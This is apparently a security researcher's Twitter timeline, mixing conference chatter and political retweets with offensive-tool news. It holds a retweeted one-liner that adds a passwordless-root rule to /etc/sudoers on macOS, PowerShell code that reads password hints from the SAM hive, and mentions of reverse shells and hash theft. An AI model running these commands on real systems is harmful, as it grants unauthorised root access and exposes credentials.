+RT @ashokkmrsingh: #OROP so by ds argument f denying soldiers leaving army under PMR r u giving rights 2 soldiers 2 serve till 60 yrs? well…
+RT @byt3bl33d3r: p2p communication using SMB pipes with Python and WinAPI!  This is going to be EPIC! http://t.co/JpvItW7o1y
+RT @BlackHatEvents: .@nikhil_mitt shows how attackers use CI tools as portals for getting a foothold &amp; lateral movement - #BHEU Briefing ht…
+[Quick Blog] Extracting Windows Users Password Hints with #PowerShell 
+http://t.co/wtUOnwHArq
+@sh4ds1dd For selection you need FUD title. Flips come on stage :D @anantshri @makash @riyazwalikar @abh1sek @w3bd3vil
+@anantshri True!  @makash @riyazwalikar @abh1sek @w3bd3vil @aseemjakhar
+RT @makash: Exactly how I feel!! @riyazwalikar @abh1sek @w3bd3vil @aseemjakhar  https://t.co/WzaUYGqCn6
+@makash Apply this to talks and the need for "ninja flips" will increase exponentially! @riyazwalikar @abh1sek @w3bd3vil @aseemjakhar
+The word "community" is more misused than the word "sophisticated" in the InfoSec Industry.
+@mattifestation @subTee Second that!
+RT @martijn_grooten: Ha, I accepted a request from one of these people. In my defence, my LinkedIn profile is essentially public https://t.…
+@subTee I am enjoying every bit :)
+@subTee Looks like you will stop only after MS starts flagging InstallUtil as malicious xD
+RT @subTee: Interactive App That Execs Inside of InstallUtil.
+An MS Signed Binary.
+Prototype.  More Soon
+https://t.co/3jO0LALEAe http://t.c…
+@_wald0 Me? Sure. @kevin_robertson @benpturner @subTee
+RT @deepsec: The #DeepSec schedule has been updated. Stuck in reviews. Waiting for submissions from speakers named #Ashley or #Madison, jus…
+RT @sunil_abraham: CCI charges #Google with rigging search results; Flipkart, Facebook corroborate complaints http://t.co/IBlb0nPt1l #compe…
+@busbauen Not really :)
+https://t.co/CxNJp57gng
+@jsnover Congratulations! Well deserved!
+-.-
+https://t.co/IA2QWkN8Za
+RT @kafucka: http://t.co/JHhlpZvGpz
+RT @SushilDora: @nikhil_mitt Congrats. Using CI tools for attack will be a nightmare for DevOps.
+@SushilDora That is what I plan to do ;)
+RT @makash: I have a theory, there exists a ministry of blocking and banning #MB&amp;B and they use different reasons to test Internet blocking…
+RT @0xmchow: I’m in awe at the number of WordPress “uploads” folders that are completely exposed. Google `Index of /wp-content/uploads`
+@s4n7h0 Thanks @anantshri
+@amolnaik4 Thanks Amol bhai :) @anantshri
+@anantshri Sure! Would love to discuss it.
+I will speak at #BlackHat Europe on "Continuous Intrusion: Why CI tools are an Attackers Best Friends" #BHEU
+https://t.co/UQNtakrUDo
+RT @anantshri: .@nikhil_mitt Congrats for BH EU : https://t.co/iEjzCku1um : Talk looks interesting. would love to discuss about it.
+@anantshri Thanks! Didn't knew about it. No notification sent to me yet :D
+Got it working with Admin privs. Will write a quick blog post tomorrow about it.
+@busbauen You need SYSTEM privs. Though, just tested with Admin privs as well. Will blog about it. 
+https://t.co/J68OC3Dy6V
+RT @ArvindKejriwal: .@RifatJawaid Which hospital? Can we get a written complaint?
+For quick test, open PowerShell as administrator and run Enable-DupilcateToken from #Nishang to get SYSTEM privs.
+#PowerShell code in one tweet to Extract Windows user password hint in clear. Needs SYSTEM privs to read SAM hive. 
+https://t.co/J89rNKK846
+$val = (Get-ItemProperty HKLM:\SAM\SAM\Domains\Account\Users\000003E9).UserPasswordHint
+foreach ($i in $val) {[char]$i}
+#PowerShell
+Already told your marketers that I am not interested in receiving calls and now you want me to receive more calls? No Online form? @TataSky
+Hey @TataSky how can I stop your pesky marketers from calling me?
+RT @0xmchow: Anyone in the CA area aware of CISO openings, or is looking for one? I have a good colleague who is looking and whom I would r…
+RT @subTee: @nikhil_mitt Here you go sir *grin*
+JScript .NET Who Cares &amp; Its Not As Bad As You Think...
+http://t.co/LDfL9fbWB6
+@subTee You sir, are fantastic.
+@subTee Come on Casey. Do a blog post :) :P
+@PyroTek3 A @DerbyCon
+RT @subTee: JScript .NET Server Side ShellCode Execution Might Look like This:
+https://t.co/Ox5vM2W4ig
+In case you were wondering http://t.…
+@subTee Wow!
+RT @subTee: Woot! Execute ShellCode via http://t.co/jQt7GXEsrc!
+Why?  No one is watching .js files
+https://t.co/iKF0e7T7bI
+Cheers http://t.…
+RT @Enno_Insinuator: @michaelossmann also I remember a vendor that burnt his fingers in an (equally dumb) stunt https://t.co/TlmjXFpL1z &amp; h…
+RT @michaelossmann: Hilarious, but good luck getting any vendor to agree the bug you found is a deliberate backdoor. https://t.co/EkT46RdvsO
+@Zigoo0 Right!
+@Zigoo0 It is not live online, yet. There is a video course at Pentester academy. http://t.co/p7DOuZkacP
+RT @adi1391: Attend the Offensive #IoT Exploitation training class at @brucon by @aseemjakhar and me. Few more seats remaining. https://t.c…
+RT @dawidczagan: #Singapore and award-winning web app hacks in Google,Yahoo,Mozilla,Twitter...? Attend my training at @HITBGSEC
+http://t.co…
+RT @Demo_God: @bettersafetynet @nikhil_mitt Do It
+RT @subTee: You Suck At PowerPoint. 
+Please Read If You Are A Presenter. Myself included...
+http://t.co/dp2t0WMGIi
+That is all.
+RT @prvnkumark: @makash Burp Suite Essentials,recommended by https://t.co/w7q3mGxNFP page,awesome bro.Great book to master burpsuite http:/…
+@AeyossYrt Thanks for sharing.
+RT @AeyossYrt: Good blue team powershell info http://t.co/RsBlitufM1 @nikhil_mitt
+RT @grsecurity: On a positive note, thanks in large part to @WEareTROOPERS we've at least covered the costs of the money thrown away on the…
+@Enno_Insinuator @WEareTROOPERS Awesomeness level +100 @grsecurity
+RT @subTee: [Blog Spam] 
+Hide In Plain Sight - COM Surrogate; Application Whitelisting Bypass &amp; Persistence "dllhost.exe"
+http://t.co/LDfL9…
+RT @duckduckgo: @lojikil @nikhil_mitt You can hack our results. Join us virtually this Saturday: http://t.co/LgEO9Vxwhw
+May be that is how they get cool (and creepy) new ideas :)
+https://t.co/EDryLm9J0R
+RT @lojikil: @nikhil_mitt @duckduckgo opsec fail. I oft think about the sheer number of ideas that flow thru their mail servers...
+@lojikil Exactly! @duckduckgo
+May be its just me but never search on Google if you are working on a new project. I prefer @duckduckgo for that.
+http://t.co/BWP1smCVcH
+RT @WEareTROOPERS: Just to let you know we sent the "repeat donation" to @grsecurity an hour ago. For those unaware pls read https://t.co/d…
+RT @WEareTROOPERS: In Jan 2013 we donated US$ 1.350 to @grsecurity. If u promise to 1st carefully read https://t.co/d6U3rnXhnB &amp; then 2nd R…
+Thanks to @subTee for his code. 
+http://t.co/aM7Fr2ErEt
+[Blog] Abusing Web Query (.iqy) files for effective phishing. #PowerShell #InfoSec
+http://t.co/aM7Fr2ErEt
+@enigma0x3 Great! Looks like waiting for someone to do it paid off xD
+Sweet! PowerShell for Penetration Testers returns to @deepsec
+Lets break the latest and greatest with #PowerShell
+https://t.co/sxxrJn8bV6
+RT @bettersafetynet: @nikhil_mitt tempt the demogods.  Live demo! (I typically have a video demo if everything goes sideways though)
+RT @crisp0r: Join us Track 1 @BSidesMCR for @benpturner and @davehardy20 with their @metasploit PowerShell Fu! Cc @Nettitude_com http://t.c…
+RT @scriptjunkie1: So if you can use Pass1234 to get to an incredibly valuable information source to spies... do you think this has only ha…
+RT @aparatbar: Arguments in the SC by the Govt.
+
+1. For Section 66A. 
+2. Against privacy. 
+3. For criminal defamation. 
+4. Against RTI on P…
+RT @ToolsWatch: 4 days before closing the Black Hat Arsenal Europe CFT. Few spots still available. Hurry up !! http://t.co/1HWnwN6R8E @Blac…
+RT @subTee: Well, Its done.  Reflective PE Injection into InstallUtil. #Mimikatz
+https://t.co/k5AATrVRIM
+Bypass All the Things :) http://t.…
+Me reading someone else's code. via @manujosephsan 
+https://t.co/lRJ9u25CAm
+RT @scriptjunkie1: (in stern schoolmaster voice) What have I told you about using passwords?
+https://t.co/AWOxOw65Fs
+RT @schwascore: If you don't 2fac your VPN, you're gonna have a bad time. https://t.co/7mlXzchGeY
+RT @anantshri: @nikhil_mitt prepare for live. Keep video as backup. Videos are ways to ensure there are no surprises.
+RT @deaconvee: @nikhil_mitt @Cyber_Dystopia well rehearsed live demo gets the best reception, even a video is also used.
+RT @haroonmeer: I hate sounding like a shill, but this is exactly what https://t.co/s6OchWeWBW solves (with just 5 minutes of setup) https:…
+Don't know if it is the pressure to perform which makes speakers go for a video demo. For me, a video only demo is equal to more slides.
+Keeping video demo backups is suggested by many but I have seen speakers just giving up on live demos if they have a recording!
+Having said that, there has not been a single talk by me where at least one of my demos didn't fail. Perils of live demos.
+I prefer Live demos. A successful one means the things you spoke of actually work. Also, the level of satisfaction after a live demo is high
+Dear Conference speakers, Live demo or Video demo or something else. Debate! #infosec
+"You could use Pass1234 from the internet to VPN to root on all servers." #FacePalm #AshleyMadison
+http://t.co/6lSSKG5OHG
+Those using wmic.exe for authenticated command execution should try Invoke-WmiMethod. Much cleaner and easier syntax. #PowerShell
+@c0dist Not my first time. Have done that earlier as well. Nope, I realized it after some Google notifications, the acct. is till with me :)
+Latest commit to Nishang is such an embarrassment. 😳
+RT @byt3bl33d3r: CrackMapExec: A swiss army knife for pentesting Windows/Active Directory environments https://t.co/uh93qoFX02 Feedback mor…
+[Blog] Executing SQL Queries from Antak Webshell. #Nishang #PowerShell #InfoSec
+http://t.co/64UzSafc2S
+RT @vmbhatia: @revathskumar @nikhil_mitt Here is an example. POST to an image :) http://t.co/eJIK6uTKIP
+RT @vmbhatia: @revathskumar @nikhil_mitt Not the only ones who do that. I've seen jetairways making POSTs with client browser data to third…
+RT @revathskumar: So @airtelindia, injecting user tracker into headers to help advertisers. http://t.co/oXWHgOTfMW
+@L4bf0x Haha. Didn't knew that. @Gr3yNoise @_defcon_
+@Gr3yNoise Thanks @L4bf0x ! It is so embarrassing to hear own interview :D  @_defcon_ @DEFCONpress
+RT @mikko: VNC roulette: connects you to random open VNC servers somewhere on the net. http://t.co/mK7nFDU1Dv 
+/by @ALLSPRk
+RT @subTee: DllGuest - COM Surrogate Persistence.  
+Launch your code from DLLHost.exe.  
+Blend in with the noise.
+https://t.co/JEfb24izup
+E…
+@jdorrough1 Great, thanks! I will let you know in case of questions.
+RT @mojorojo: LOL Net Neutrality forum suddenly NOT on MyGov homepage, if you want to comment, here's a direct link to the forum http://t.c…
+RT @mojorojo: AIB and #SaveTheInternet are proud to present 2 SAVE 2 INTERNET https://t.co/DLC9IwbYpm (Please share for internet independen…
+@kevin_robertson Cool! It is very good already! @benpturner @subTee
+@jdorrough1 I missed it! Do you mind if I port this to Kautilya?
+https://t.co/5uPmZBUWOy
+@benpturner Yup. I plan to use it, it looks good. It is unable to replay/relay the hashes yet. @subTee
+How India treats its Veterans. #OROP
+https://t.co/o5n6zqUdHa
+@subTee Great!
+RT @subTee: Steal NTLM Hashes Over HTTP in #powershell POC
+https://t.co/GPRz7G4U5U
+netntlm format, -Cheers :) cc: @nikhil_mitt http://t.co/…
+@jstnkndy About some PS code I wrote to generate a iqy and a web server which will log requests. Also, using it to capture hashes.  @subTee
+@subTee A SMB listener, like in MSF, can catch hashes in such case. After tests, that will be a part of my blog post as well.  @jstnkndy
+@jstnkndy Yes it does. @subTee @Ben0xA
+Use Web Query (.iqy) files for easy phishing. Blog post and #Nishang commit soon. Thanks to @subTee http://t.co/izZH4cCoRy
+RT @garage4hackers: Drive It Like You Hacked It by @samykamkar 
+Registration link
+https://t.co/NirCpBombP
+Deatils
+http://t.co/kY0JLJuiEA ht…
+RT @PyroTek3: 1/3: "Because this feature provides the ability to persistently execute system software in the context of Windows, ..." #WBPT
+Added #WPBT to my wishlist. I expect someone (other than the OEMs) to abuse it in near future.
+@subTee Great find! I should add this to my tools :)
+RT @subTee: Oh.. I've found something lovely.  IQY files are just text files, but associated with Excel..  1 Security Prompt.
+https://t.co/…
+My TL is full of EULA jokes xD
+RT @subTee: wevtutil sl Microsoft-Windows-Sysmon/Operational 
+/ms:[Something Terribly Small] Min 64K
+
+Shrink Sysmon Log To Roll Out Your Ac…
+@alexandair @Actually_Shant Thanks guys.
+@subTee Wow! Thanks for letting me know.
+RT @subTee: Great to see Nishang featured in Hackers Playbook 2
+http://t.co/Wz8pSWdkGT
+This is good work:
+https://t.co/KKR8kXPBie
+cc @nikhi…
+@darkpawH @oising @sunnyc7 @Lee_Holmes @mattifestation @PyroTek3 @williballenthin @jaredcatkinson That Indian on right side is handsome! ;)
+I've lost track of day and time. Still traveling to home from #Defcon
+RT @scroll_in: The riot that wasn’t: How Twitter spread rumours of communal violence in Kolkata http://t.co/VHpWmBjcNN http://t.co/WpshjMlu…
+@mattifestation @RGKelley5 @Lee_Holmes @JosephBialek @sunnyc7 @PyroTek3 @tifkin_ @jaredcatkinson @sixdub I am near the Blue Corvette.
+@Lee_Holmes I will be there.
+@Lee_Holmes cc @JosephBialek @mattifestation @RGKelley5 @sunnyc7 @PyroTek3
+@PyroTek3 Ah! Lets do it tomorrow.
+@PyroTek3 Hey, I would like to meet you. Where are you? I am outside the Lockpick village.
+@Carlos_Perez Awesome! I always wanted to do that. Never thought it could be really done. I will definitely ask you about the experience.
+@egyp7 Yup, its not better. That was my point as well. Sends out a message that a good hacker should drink. @Carlos_Perez
+@Carlos_Perez I was asked to do a shot of water. @egyp7
+@Carlos_Perez For 2 days? I struggle with 500 slides. That too after leaving so much stuff.
+@RGKelley5 Ok. How about meeting at 12 at the Packet Hacking village?
+RT @RGKelley5: Great experience speaking @_defcon_  today! Thanks everyone for coming out! All the code for Harness is at https://t.co/ibof…
+@RGKelley5 Hey, I missed your talk yesterday. How was the response? Would like to meet today and pick your brain on that.
+RT @L4bf0x: Big thanks to @nikhil_mitt for telling @Gr3yNoise about his Kautilya tool for automated pentesting! @DEFCONpress #DEFCON
+@g33xter Thanks!
+Going to present at the #HHV on Hacking with Human Interface Devices in 40 minutes. #Defcon #Kautilya
+RT @sunnyrockzzs: Anybody at #defcon who has an extra pass? I lost my card, so I am without money today :(
+Please DM me if you are willing …
+@bettersafetynet Unfortunately, no. @DerbyCon
+@bettersafetynet Bad! I wanted to meet you. Next year or some other conference :)
+@subTee Wow! *Hysterical evil laugh*
+RT @subTee: Interactive PowerShell and Run Local Scripts Inside InstallUtil.exe
+https://t.co/hvfJ0Q62Rz
+Your Move Whitelisting http://t.co/…
+@bettersafetynet Are you not coming to Defcon?
+RT @subTee: Interactive PowerShell inside InstallUtil. 
+Hide Commands and Script Execution.
+Overcome Constrained Mode :)
+https://t.co/zyzdN…
+RT @ToolsWatch: The #BHUSA Arsenal is OVER :( Thanks a million for all of you guys who made our day !! It was Tremendously AWESOME !! See u…
+@_nullbind Hey. I had a Arsenal Preso. Lets meet at Defcon!
+@Lee_Holmes I am in. @JosephBialek @sunnyc7
+@S0ftwarGs Sure. Thanks
+RT @S0ftwarGs: @nikhil_mitt : Black Hat Arsenal : good presentation of nishang
+@c0dist Yes. Lets meet up!
+Come to #BHArsenal today to see #Kautilya and get some stickers.
+@ToolsWatch Great! He is awesome! @anantshri
+RT @jsnover: .@usedtire One comment: we added "ByPass" to make it absolutely unambigous that executionpolicies were NOT a security boundary.
+@_nullbind Dude, you at BH today?
+@JosephBialek @sunnyc7 @Lee_Holmes I would like to meet all of you gents.
+@J4vv4D No I came back to the hotel. Are you coming to the Blackhat party tonight?
+RT @dafthack: Awesome application whitelisting bypass talk by @subtee at #bsideslv. Nice work!
+@prateekg147 Of Course! @SecurityTube
+@SecurityTube Yes. Met friends at BSides.
+@SecurityTube Keep one for me :)
+@J4vv4D Sir, where are you?
+@ChrisJohnRiley Chris. If you are there, could you please ask for a walk-in badge/entry? I just got up and may be unable to reach on time.
+@JGamblin Great! Thank you very much.
+@JGamblin Hey Jerry, could you please get a walk in pass for me for BSides. I am running late :)
+RT @J3_D1: Nishang: PowerShell for Penetration Testing &amp; Offensive Security http://t.co/BU19XFEF95 via @nikhil_mitt
+samratashok/nishang · G…
+RT @SECURI0SITY: shoutout to @nikhil_mitt for this cool PowerShell pentesting platform 
+
+https://t.co/5JY4bAFjdU
+@SECURI0SITY Thanks!
+Reached Vegas. Excited to meet so many fellow hackers tomorrow.
+RT @haroonmeer: Let's be done with the whole "combination might be a birthday" ambiguity.*
+
+* Bonus points for reducing the space too http:…
+RT @jub_in: Wish all border crossings become as easy. Here's the pedestrian exit to India from Bhutan :) http://t.co/HrELED0n0J
+RT @mattjay: Jinkies! http://t.co/XMAxaXWVD3
+RT @FutureProcessin: Launch more powerful attacks with cookies and see cookie-based bug bounty hacks. Vote for @dawidczagan at @HITBGSEC ht…
+RT @GazTheJourno: Holy crap. Win 10 is the NSA's wet dream of an operating system. Spyware, keyloggers, botnet functions, all built in. htt…
+RT @passingthehash: at least I didn't find any gpo to disable wifi-sense in any logical place...
+@mattifestation lol
+@mattifestation Oh come on. A live demo, even if failed, looks better :)
+Terrifying story of an Indian woman detained in US. 
+"Detained by chance. Unbroken by choice."
+https://t.co/xYC7sa91Ea
+RT @Jolly: Windows 10 - #Bitlocker automatically updates your full disk encryption key to #OneDrive - https://t.co/3mrg39s5oY
+RT @jjarmoc: You know what this means?  MORE BROWSER TABS! https://t.co/JGMaLLvpxk
+@subTee Works like a charm. Merged it into Nishang and soon in Kautilya. Thanks!
+RT @subTee: Rewrote PoshRat: 
+Now Zero Reliance on Local Certificate Store.
+And Enforces Certificate Pinning :)
+https://t.co/H4u6xILoCk
+cc …
+RT @_nullbind: [Blog] Auto-Dumping Domain Credentials using SPNs, PowerShell Remoting, and Mimikatz
+https://t.co/FZGfgLhhZQ
+@Carlos_Perez I think Casey implement that. Testing is due on my part. @subTee
+@subTee The client part of the script is so small, it fits into anything.
+@subTee Saw that and it looks great.
+Invoke-PoshRatHttps (courtesy @subTee ) is my favorite payload for #Kautliya. An interactive reverse https PowerShell session in &lt; 10 secs.
+@Ashishdp Bhai Bhakton ko dekh dekh ke seekh raha hun :)
+@Ashishdp Sahi baat hai. Nalla Modi hai aur kos Kejriwal ko lo.
+India's response to Terrorist attack attributed to Pakistan: We won't play Cricket with them. #WTF #GurdaspurAttack
+@subTee Absolutely.
+@subTee This will lead you to SCOM soon ;)
+RT @subTee: Got It. Works In My Lab :) 
+Remote WMI Local\User -&gt; Remote\System
+https://t.co/aozFX9JJsX
+cc @PyroTek3 http://t.co/PajhkLROlz
+RT @garage4hackers: One stop location to keep track of all upcoming #g4hwebcast &amp; previous recordings. Share &amp; bookmark #infosec #appsec
+ht…
+@armitagehacker OMG O_O
+RT @sunil_abraham: Modi Wants the #DNA Profiling Bill Passed Right Away. Here’s Why It Shouldn’t Be http://t.co/fHptfymLJI #India
+RT @ToolsWatch: [BREAKING NEWS] - The #BHEU Arsenal Europe Amsterdam 2015 Call for Tools is Online. Secure a spot here &gt;&gt; http://t.co/1HWnw…
+@subTee In case meterpreter is your goal. @jsnover
+@subTee You probably know this but msfvenom -f is your friend for a meterpreter using Invoke-WmiMethod @jsnover
+RT @garage4hackers: If you looking to join us as G4H Ranchoddas webcast team, then please submit the following form. 
+
+https://t.co/kGFMUxF…
+RT @i0n1c: Wonder how many people have executed the shell commands in those tweets and now have permanent public root shells installed with…
+RT @i0n1c: echo python -c '"import os;os.write(3,\"ALL ALL=(ALL) NOPASSWD: ALL\")"'|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo su # via re…
+I offered to do a replacement Workshop but @_defcon_ says its too late.
+https://t.co/No7ZrJgFOH
+RT @orsoraggiante: Citizens have no fundamental right to privacy, GoI tells Supreme Court http://t.co/zgK1l9bglO | Indian courts don't know…
+@gregkcarson Thanks. I have raised an issue on the github repo. Could you please update that after checking?
+https://t.co/K4gEqRPNZt
+@gregkcarson Could be a PowerShellv2 problem. I tested it on a PowerShellv3 and Office 2013 machine right now.
+@gregkcarson Are you using the latest version of Nishang? What is the PowerShell version and Office version on the computer?
+RT @sonaliranade: Democracy has been absolutely negated in Delhi without a whimper of protest from society at large.  #AAP
+RT @sonaliranade: The elected Govt. in Delhi has been reduced to a joke by Modi ji thru the backdoor.  That is hardly democratic.
+@anantshri Nice! Thanks.
+Last memory corruption exploit I used in a PenTest was about 4 years ago. Exploiting mis-configs and features FTW.
+RT @saikatd: Much of India's internet communications passes through Pakistan. Since 2013 the ISI is tapping into it, I report. 
+http://t.co…
+It didn't took long xD
+https://t.co/c53vh7NMd4
+https://t.co/vgt6tKAZ7n
+RT @jaredcatkinson: Happy to announce that I will be speaking about Using PowerShell as a Digital Forensics platform at @44CON!
+@subTee Wow! Thanks for sharing.
+RT @subTee: PoshRat: Added basic WebDAV R/W Proof of Concept.
+https://t.co/BYjybb0mGZ
+Will update static content soon. 
+cc @nikhil_mitt
+Gave up on integrating Squid to my lab Windows domain, at least for this weekend. What a pain to setup :(
+Looking for a freelance designer in India to get couple of logos designed. Please RT.
+"More than half (57 percent) of survey respondents indicated that sophisticated attacks ranked as the top concern" - They mean phishing?
+RT @ppolstra: I deduce that my Linux Forensics proof has finally arrived /cc @SecurityTube http://t.co/XwzsPM0iwf
+@ppolstra Great! I will be there. @SecurityTube
+@ppolstra Not a fan of selfies but I want one with you wearing this hat and pipe. Make sure you bring them to Defcon :) @SecurityTube
+I have an extra #Blackhat briefings pass. Ping me to get it on face value (or early bird rate if you are a poor hacker)
+RT @TheColonial: @nikhil_mitt and that's most of them these days. Many just use windows tools once they have a foothold.
+Second that. Now think of red teams which use #PowerShell well.
+https://t.co/3dtREvSyAy
+@mattifestation Oh you will. Just don't do a video demo :) @subTee
+So much of PowerShell goodness at BH/Bsides/Defcon this year. Already time stressed PowerShell for Pentesters will be a 3 day course now :D
+@mattifestation Don't be sad :P I will present it at some other place. Too many sub-events for me already :) @subTee
+@subTee I submitted my own little WMI (and other) shellcode exec techniques for defcon. Probably killed by @mattifestation's talk.
+@SecurityTube Hahaha
+@SecurityTube Wohoo! Congrats Vivek!
+RT @SecurityTube: Excited! trying my best to release the draft version at @__defcon__ at our booth --  "Make your own Hacker Gadget" http:/…
+RT @garage4hackers: Unauthenticated File Upload flaw in #Oracle E-business Suite by @SandeepL337 http://t.co/1idmxHKNBv #appsec #infosec
+RT @thewire_in: Ajay Hatewar shared a pic of Dev Fadnavis chilling on a yacht, got arrested under the IT Act http://t.co/k3zcdWVMBz http://…
+@anantshri True that.
+@anantshri I do it for fun and profit ;)
+@anantshri My disclosure "ideology" applies only to commercial software. @CodeVigilant
+@anantshri Agree. Most of them are just peanuts. @CodeVigilant is a great initiative.
+@anantshri Even without a bug bounty? That's generous of you :P
+And its not worth the legal risk either. I like to sit on the bugs and sparingly use them in my trainings/pen tests.
+If it is of interest to anyone, I don't do any kind (responsible/full/coordinated/whatever) disclosure. For me, its just not worth the time.
+A good (and long) piece by @Enno_Insinuator on Vulnerability Disclosure.
+http://t.co/xXPWETi3CE
+RT @musalbas: This is the security advisory that @ImperoSoftware is trying to censor with a legal threat: https://t.co/ROZPQvJAdR.
+
+Streisa…
+RT @subTee: EvilWMIProvider Example:
+"wmic.exe path win32_Evil" or
+Invoke-WmiMethod -Class Win32_Evil -Name ExecShellCode
+https://t.co/mwQK…
+Massive updates to #Kautilya under progress. Keep an eye on its repository
+https://t.co/5uPmZBUWOy
+RT @l33tdawg: "Attacking the FireEye MPS” http://t.co/0SQoF4Cwtl  &lt;— Includes a complete remote compromise! Sweet! cc @Enno_Insinuator #HIT…
+RT @byt3bl33d3r: Looking for a #MITMf sponsor! As of today I'm unable to cover the cost of the trip to @BlackHatEvents for the Arsenal in V…
+RT @subTee: Invoke-WmiMethod -Namespace root\cimv2 -Class Win32_Evil -Name ExecShellCode Is complete.UAT?
+https://t.co/kfBeU9GEiA http://t.…
+RT @jaredcatkinson: @mattifestation @harmj0y @sixdub @subTee Arbitrary PowerShell execution via my Win32_TCPConnection provider... http://t…
+@mattifestation Almost any Base64 is too long for HID (when using it as a keyboard) but there are many scenarios where it could come handy.
+@mattifestation So many opportunities to use it come to mind *evil grin*
+@mattifestation That is a brilliant method! Thanks for sharing.
+Great! I will give a talk: "Hacking with Human Interface Devices" at the #Defcon Hardware Hacking Village.
+Back home after a rocking @shakacon . Added another conference to my small list of recommended conferences.
+RT @wallofsheep: Our speaker workshops schedule @_defcon_ 23 is now live! http://t.co/X5DGgUvYsd #defcon
+RT @ITSecurityguard: https://t.co/JAB3n7y93l for all the APT, CYBER, and CHINA Lovers out there :-)
+@SecurityTube @ppolstra That is awesome! Congrats Phil!
+@jameslnies Thank you for coming James. I am glad you liked it.
+RT @jameslnies: @nikhil_mitt thank you for running a great PowerShell for Pen Testing training session.
+RT @sunnyrockzzs: So you thought http://t.co/0O9bRZdmZ5 was hacked? Of course not ! It is a publicity stunt. My views - http://t.co/957T8IM…
+@MalwareJake Set a PowerShell reverse shell as the payload.
+RT @SecurityTube: LINUX FORENSICS is Pentester Academy's first published book by @ppolstra Signup for a copy https://t.co/oYpQ9ddrqQ http:/…
+RT @kennwhite: Still marveling that browsers expose laptop *battery statistics*. Great work on fingerprinting by @lukOlejnik et al: http://…
+RT @Viss: Woooooow. Hackingteams root mysql password is Ht2015! ? http://t.co/s3VaVvzu2P
+Just saw an ad of @devryuniv on YouTube. Taking #Cyber to the next level. #FaceCyber
+RT @Dinosn: No one expect command execution !
+ http://t.co/AhdmFiKYAL
+RT @subTee: Another AV/AW Bypass with .NET 
+https://t.co/amPkLh50Tp
+Meterpreter Reverse_HTTP 0/55 
+#avlol #awlol
+Fun Fun http://t.co/5uBmr7…
+RT @PyroTek3: I'm speaking @shakacon in ~2 weeks on AD attack &amp; defense including a new Kerberos ticket persistence method. #infosec #mimik…
+RT @SecurityJon: This kickstarter will be a godsend to on-site Pen Testers if it actually works. http://t.co/aHIw4FCoch Monitors++
+RT @ehorley: @Enno_Insinuator Thanks - There is an update that includes some PowerShell that might be useful at http://t.co/XL9dclgI6s
+@Carlos_Perez Congrats :)
+@DexterPOSH Congrats!
+@ravikanth Great! Congrats :)
+RT @byt3bl33d3r: I'm soooo looking forward to playing around with this! It just gets better and better the more I hear about it!
+https://t.…
+@pranesh_prakash Haha. Congrats ;D
+"To register the SPN, the Database Engine must be running under a built-in account..such as a domain administrator" 
+https://t.co/W14BIpScke
+RT @makash: Ticket kiosk at PVR booting up. Windows embedded username is vista and no password, domain is Koramangala http://t.co/N9bTdyiCOE
+RT @shakacon: Preview of 2015 Shakacon Badges - and yes that is a black badge for whomever wins CTF this year!  Register now! http://t.co/x…
+RT @hdmoore: Meterpreter Paranoid Mode: https://t.co/4FwEYGhBax
+RT @makash: Would anyone know if Amazon is running a test data centre in India currently? Please RT
+RT @BlackHatEvents: .@nikhil_mitt has new payloads, live demos in the #BHUSA Arsenal edition of Kautilya, a framework for pentesting HIDs h…
+RT @SCMP_News: 'How we are slowly killing the planet with our love of #meat,' Brahma Chellaney. Full article: http://t.co/0dGjshbKra http:/…
+RT @ppolstra: Come 2 @SecurityTube booth @_defcon_ 4 chance 2 win @WAWTechn0l0gies  CatchWire-my hacking &amp; Linux forensics books http://t.c…
+RT @pent0thal: Leaked source code for argentine voting machine &amp; RCE uncovered 2 hours later - https://t.co/TfAuJnV4E4
